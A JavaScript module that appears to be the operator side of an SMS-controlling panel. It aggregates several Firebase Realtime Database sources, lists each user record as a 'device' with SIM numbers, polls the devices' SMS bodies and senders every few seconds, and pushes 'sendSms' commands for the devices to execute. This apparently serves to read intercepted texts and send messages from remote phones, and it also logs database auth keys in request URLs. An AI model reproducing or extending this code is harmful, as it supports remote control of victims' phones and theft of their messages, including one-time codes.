/**
 * FIREBASE MANAGER
 * Handles multiple Firebase connections using Realtime Database
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let firebaseInstances = {};
let allDevices = [];
let deviceListeners = {};
let isInitialized = false;
let firebaseConfigsCache = null;

// ────────────────────────────────────────────────
// CONFIG LOADING - FROM JSON FILE
// ────────────────────────────────────────────────

async function loadFirebaseConfigs() {
    console.log('📢 Loading Firebase configs from JSON file...');
    try {
        const response = await fetch('data/firebase-configs.json?' + Date.now());
        if (response.ok) {
            const data = await response.json();
            firebaseConfigsCache = data;
            localStorage.setItem('firebase_configs', JSON.stringify(data));
            console.log('✅ Firebase configs loaded from JSON file:', data.sources ? data.sources.length : 0, 'sources');
            return data;
        } else {
            console.log('⚠️ Could not load firebase-configs.json, status:', response.status);
        }
    } catch (e) {
        console.log('⚠️ Error loading firebase-configs.json:', e.message);
    }
    
    try {
        const data = localStorage.getItem('firebase_configs');
        if (data) {
            const parsed = JSON.parse(data);
            if (parsed.sources && parsed.sources.length > 0) {
                console.log('📢 Firebase configs loaded from localStorage fallback');
                firebaseConfigsCache = parsed;
                return parsed;
            }
        }
    } catch (e) {
        console.error('Error loading from localStorage:', e);
    }
    
    console.log('📢 No Firebase configs found');
    return { sources: [] };
}

async function getAllFirebaseSources() {
    const configs = await loadFirebaseConfigs();
    return configs.sources || [];
}

// ────────────────────────────────────────────────
// INITIALIZATION - Realtime Database
// ────────────────────────────────────────────────

async function initFirebaseConnections() {
    try {
        const configs = await loadFirebaseConfigs();
        console.log('📢 Firebase configs loaded:', configs);
        
        if (!configs || !configs.sources || configs.sources.length === 0) {
            console.log('📢 No Firebase sources configured');
            return false;
        }

        console.log(`📢 Connecting to ${configs.sources.length} Firebase source(s)...`);
        
        let successCount = 0;
        for (const source of configs.sources) {
            console.log(`📢 Connecting to Firebase: ${source.id}`);
            const connected = await connectToFirebase(source);
            if (connected) {
                successCount++;
                console.log(`✅ Connected to Firebase: ${source.id}`);
            } else {
                console.log(`❌ Failed to connect to Firebase: ${source.id}`);
            }
        }

        isInitialized = true;
        console.log(`📢 Connected to ${successCount}/${configs.sources.length} Firebase sources`);
        return successCount > 0;
    } catch (error) {
        console.error('❌ Error initializing Firebase:', error);
        return false;
    }
}

async function connectToFirebase(source) {
    try {
        const { id, url, key } = source;
        
        if (firebaseInstances[id] && firebaseInstances[id].connected) {
            return true;
        }

        console.log(`📢 Connecting to Firebase source: ${id}`);
        console.log(`📢 URL: ${url}`);

        // For Realtime Database, we use the REST API
        // Store the connection info
        firebaseInstances[id] = {
            config: source,
            connected: true,
            url: url,
            key: key
        };

        // Test connection by fetching users
        const testUrl = `${url}/users.json?auth=${key}&limitToFirst=1`;
        const response = await fetch(testUrl);
        
        if (response.ok) {
            const data = await response.json();
            console.log(`📢 Test query returned ${data ? Object.keys(data).length : 0} users`);
            return true;
        } else {
            console.error(`❌ Test failed: ${response.status}`);
            firebaseInstances[id].connected = false;
            return false;
        }
    } catch (error) {
        console.error(`❌ Failed to connect to Firebase ${source.id}:`, error);
        firebaseInstances[source.id] = {
            config: source,
            connected: false,
            error: error.message
        };
        return false;
    }
}

function disconnectFromFirebase(sourceId) {
    try {
        if (firebaseInstances[sourceId]) {
            if (deviceListeners[sourceId]) {
                deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
                delete deviceListeners[sourceId];
            }
            delete firebaseInstances[sourceId];
            console.log(`📢 Disconnected from Firebase: ${sourceId}`);
        }
    } catch (error) {
        console.error(`❌ Error disconnecting from Firebase ${sourceId}:`, error);
    }
}

// ────────────────────────────────────────────────
// DEVICE MANAGEMENT - Realtime Database
// ────────────────────────────────────────────────

async function fetchAllDevices() {
    allDevices = [];
    const sources = Object.keys(firebaseInstances);

    console.log(`📢 Fetching devices from ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) {
            console.log(`⚠️ Source ${sourceId} is not connected, skipping...`);
            continue;
        }

        try {
            console.log(`📢 Fetching devices from ${sourceId}...`);
            const devices = await fetchDevicesFromSource(sourceId);
            console.log(`📢 Found ${devices.length} devices in ${sourceId}`);
            allDevices = allDevices.concat(devices);
        } catch (error) {
            console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        }
    }

    console.log(`📢 Total devices found: ${allDevices.length}`);
    return allDevices;
}

async function fetchDevicesFromSource(sourceId) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Fetch users from Realtime Database
        const apiUrl = `${url}/users.json?auth=${key}`;
        console.log(`📢 Fetching from: ${apiUrl}`);
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        const devices = [];

        if (!data) {
            console.log('⚠️ No users found in Realtime Database');
            return [];
        }

        const userIds = Object.keys(data);
        console.log(`📢 Found ${userIds.length} users in Realtime Database`);

        for (const userId of userIds) {
            const userData = data[userId];
            const commandData = userData.commands || userData;
            
            const device = {
                id: userId,
                sourceId: sourceId,
                name: commandData.body ? commandData.body.substring(0, 20) : userId.substring(0, 8),
                number: commandData.number || commandData.to || 'N/A',
                status: commandData.status === 'pending' ? 'offline' : 'online',
                battery: 50,
                signal: '4G',
                model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
                lastSeen: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                sims: commandData.number ? [commandData.number] : ['N/A'],
                unread: 0,
                raw: userData,
                smsBody: commandData.body || commandData.message || commandData.text || '',
                smsSender: commandData.number || commandData.from || 'Unknown',
                smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
            };
            
            devices.push(device);
            console.log(`✅ Parsed device: ${device.id.substring(0, 8)}...`);
        }

        return devices;
    } catch (error) {
        console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        throw error;
    }
}

function listenToDevices(callback) {
    Object.keys(deviceListeners).forEach(sourceId => {
        deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
    });
    deviceListeners = {};

    const sources = Object.keys(firebaseInstances);
    console.log(`📢 Setting up listeners for ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) continue;

        console.log(`📢 Setting up listener for ${sourceId}...`);
        
        // For Realtime Database, we poll every 5 seconds
        // (Firebase RTDB doesn't have onSnapshot like Firestore)
        const intervalId = setInterval(async () => {
            try {
                const devices = await fetchDevicesFromSource(sourceId);
                // Update allDevices with this source's data
                const otherDevices = allDevices.filter(d => d.sourceId !== sourceId);
                allDevices = [...otherDevices, ...devices];
                if (callback) callback(allDevices);
            } catch (error) {
                console.error(`❌ Error polling devices from ${sourceId}:`, error);
            }
        }, 5000);

        if (!deviceListeners[sourceId]) {
            deviceListeners[sourceId] = [];
        }
        deviceListeners[sourceId].push(() => clearInterval(intervalId));
    }
}

// ────────────────────────────────────────────────
// SMS MANAGEMENT - Realtime Database
// ────────────────────────────────────────────────

async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        
        if (!data) {
            return [];
        }
        
        const commandData = data.commands || data;
        
        if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
            return [{
                id: deviceId,
                sender: commandData.number || commandData.from || 'Unknown',
                body: commandData.body || commandData.message || commandData.text || '',
                time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                simNumber: commandData.number || 'N/A',
                type: commandData.type || 'incoming',
                raw: commandData
            }];
        }
        
        return [];
    } catch (error) {
        console.error(`❌ Error fetching SMS for device ${deviceId}:`, error);
        return [];
    }
}

function listenToSms(deviceId, sourceId, simNumber, callback) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        console.error('❌ Firebase not connected');
        return null;
    }

    console.log(`📢 Setting up SMS listener for device: ${deviceId}, SIM: ${simNumber}`);

    // Poll every 3 seconds for SMS updates
    const intervalId = setInterval(async () => {
        try {
            const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
            if (callback) callback(messages);
        } catch (error) {
            console.error('❌ Error polling SMS:', error);
        }
    }, 3000);

    return () => clearInterval(intervalId);
}

// ────────────────────────────────────────────────
// SEND SMS - Realtime Database
// ────────────────────────────────────────────────

async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        const smsData = {
            Action: "sendSms",
            action: "sendSms",
            body: message,
            command: "sendSms",
            from: 1,
            isSended: false,
            message: message,
            number: toNumber,
            sim: 1,
            simSlot: 1,
            status: "pending",
            text: message,
            timestamp: Date.now(),
            to: toNumber,
            type: "sendSms"
        };

        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
        const response = await fetch(apiUrl, {
            method: 'PATCH',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ commands: smsData })
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        return {
            success: true,
            id: deviceId,
            message: 'SMS sent successfully'
        };
    } catch (error) {
        console.error('❌ Error sending SMS:', error);
        throw error;
    }
}

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.loadFirebaseConfigs = loadFirebaseConfigs;
window.getAllFirebaseSources = getAllFirebaseSources;
window.initFirebaseConnections = initFirebaseConnections;
window.connectToFirebase = connectToFirebase;
window.disconnectFromFirebase = disconnectFromFirebase;
window.fetchAllDevices = fetchAllDevices;
window.fetchDevicesFromSource = fetchDevicesFromSource;
window.listenToDevices = listenToDevices;
window.fetchSmsForDevice = fetchSmsForDevice;
window.listenToSms = listenToSms;
window.sendSms = sendSms;
window.firebaseInstances = firebaseInstances;
window.allDevices = allDevices;
